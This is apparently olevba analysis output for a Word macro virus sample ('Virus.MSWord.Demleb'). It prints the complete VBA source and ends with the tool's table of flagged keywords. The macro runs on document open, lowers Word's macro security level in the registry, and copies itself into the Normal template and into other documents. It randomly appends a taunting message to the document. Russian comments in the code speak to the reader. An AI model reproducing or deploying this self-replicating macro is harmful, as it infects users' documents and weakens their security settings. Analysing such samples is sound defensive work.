olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Demleb-20d0d416dc9889dc78fd96afe0aa5cbbe1349f1a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThissDocument.cls 
in file: Virus.MSWord.Demleb-20d0d416dc9889dc78fd96afe0aa5cbbe1349f1a - OLE stream: 'Macros/VBA/ThissDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Dim Response
' Если ты читаешь эти строки, значит ты уже немного шаришь
' в макросах, и это есть хорошо.  Ты спаситель мира, и только
' ты должен разобраться как он работает и удалить Его. Удачи!.
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
'CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
'CommandBars("Tools").Controls("Macro").Enabled = False
'Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Set ActDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormTemp = NormalTemplate.VBProject.VBComponents.Item(1)
NTColLn = NormTemp.CodeModule.CountOfLines
ADColLn = ActDoc.CodeModule.CountOfLines
BGN = 2
If ActDoc.Name <> "ThissDocument" Or ADColLn < 4 Then DoAD = True
If NormTemp.Name <> "ThissDocument" Or NTColLn < 4 Then DoNT = True
If DoNT <> True And DoAD <> True Then GoTo NoToInfect
'
If DoNT = True Then
NormTemp.Name = "ThissDocument"
If NTColLn > 0 Then NormTemp.CodeModule.DeleteLines 1, NTColLn
Do While ActDoc.CodeModule.Lines(1, 1) = ""
ActDoc.CodeModule.DeleteLines 1
Loop
NormTemp.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ActDoc.CodeModule.Lines(BGN, 1) <> ""
NormTemp.CodeModule.InsertLines BGN, ActDoc.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
'
Response = MsgBox("Дембель неизбежен?", vbYesNo, vbDefaultButton2, "ДМБ-2002")
If Response = vbYes Then
GoTo NoToInfect
Else
If DoAD = True Then
ActDoc.Name = "ThissDocument"
If ADColLn > 0 Then ActDoc.CodeModule.DeleteLines 1, ADColLn
Do While NormTemp.CodeModule.Lines(1, 1) = ""
NormTemp.CodeModule.DeleteLines 1
Loop
ActDoc.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NormTemp.CodeModule.Lines(BGN, 1) <> ""
ActDoc.CodeModule.InsertLines BGN, NormTemp.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
End If
NoToInfect:
'Destruct
If Year(Now) > 2001 And Rnd > 0.95 Then
Selection.EndKey wdStory
Selection.TypeParagraph
Selection.TypeText "Hi LameR": Selection.TypeParagraph
Selection.TypeText "The Extremist has you..": Selection.TypeParagraph
Selection.LanguageID = wdRussian
End If
'
If NTColLn <> 0 And ADColLn = 0 And (InStr(1, ActiveDocument.Name, "Документ") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Документ") = True) Then
ActiveDocument.Saved = True: End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

